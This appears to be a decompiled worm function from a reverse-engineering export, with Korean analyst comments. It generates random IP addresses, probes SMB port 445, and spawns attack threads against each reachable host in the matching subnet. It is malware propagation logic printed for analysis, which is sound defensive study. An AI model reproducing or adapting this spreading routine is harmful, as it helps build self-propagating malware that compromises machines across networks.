// --- Metadata ---
// Function Name: netSpreadRandomIP_407840
// Address: 0x407840
// Exported At: 20250528_133839
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn netSpreadRandomIP_407840(void *a1)
{
  DWORD (__stdcall *v1)(); // esi
  DWORD v2; // edi
  HANDLE v3; // ebp
  DWORD v4; // ebp
  DWORD v5; // eax
  signed int v6; // ebp
  int v7; // ecx
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // ebx
  unsigned int v11; // eax
  int v12; // eax
  int v13; // edi
  void *v14; // esi
  void *v15; // eax
  void *v16; // esi
  int v17; // [esp+10h] [ebp-118h]
  int v18; // [esp+14h] [ebp-114h]
  unsigned int v19; // [esp+18h] [ebp-110h]
  signed int v20; // [esp+1Ch] [ebp-10Ch]
  DWORD v21; // [esp+1Ch] [ebp-10Ch]
  __time32_t Time; // [esp+20h] [ebp-108h] BYREF
  char randomIP[260]; // [esp+24h] [ebp-104h] BYREF

  v1 = GetTickCount;
  v17 = 1;
  v18 = 1;
  v2 = GetTickCount();
  time(&Time);
  v3 = GetCurrentThread();
  v4 = v3 + GetCurrentThreadId();
  v5 = GetTickCount();
  srand(v4 + Time + v5);
  v6 = v20;
  while ( 1 )                                   // 웜의 핵심 네트워크 전파 스레드 루틴 
  {
    do
    {
      if ( v1() - v2 > 0x249F00 )
        v17 = 1;
      if ( v1() - v2 > 0x124F80 )
        v18 = 1;
      if ( !v17 )
        break;
      if ( a1 >= 32 )
        break;
      v8 = genRandomNumForIPAddr_407660(v7);
      v7 = 255;
      v6 = v8 % 255;
    }
    while ( v8 % 255 == 127 || v6 >= 224 );
    if ( v18 && a1 < 32 )
    {
      v9 = genRandomNumForIPAddr_407660(v7);
      v7 = 255;
      v19 = v9 % 255;
    }
    v10 = genRandomNumForIPAddr_407660(v7) % 255u;
    v11 = genRandomNumForIPAddr_407660(255);
    sprintf(randomIP, "%d.%d.%d.%d", v6, v19, v10, v11 % 0xFF);// 무작위 IP 주소를 생성
    v12 = inet_addr(randomIP);
    if ( isPort445Open_407480(v12) > 0 )        // 해당 IP의 SMB 포트(445번)가 열려 있는지 확인
      break;
LABEL_23:
    Sleep(0x64u);
  }
  v17 = 0;
  v18 = 0;
  v21 = v1();
  v13 = 1;
  while ( 1 )
  {
    sprintf(randomIP, "%d.%d.%d.%d", v6, v19, v10, v13);
    v14 = inet_addr(randomIP);
    if ( isPort445Open_407480(v14) <= 0 )
      goto LABEL_20;
    v15 = beginthreadex(0, 0, StartAddress, v14, 0, 0);
    v16 = v15;
    if ( v15 )
      break;
LABEL_21:
    if ( ++v13 >= 255 )
    {
      v2 = v21;
      v1 = GetTickCount;
      goto LABEL_23;
    }
  }
  if ( WaitForSingleObject(v15, 3600000u) == 258 )
    TerminateThread(v16, 0);
  CloseHandle(v16);
LABEL_20:
  Sleep(0x32u);
  goto LABEL_21;
}
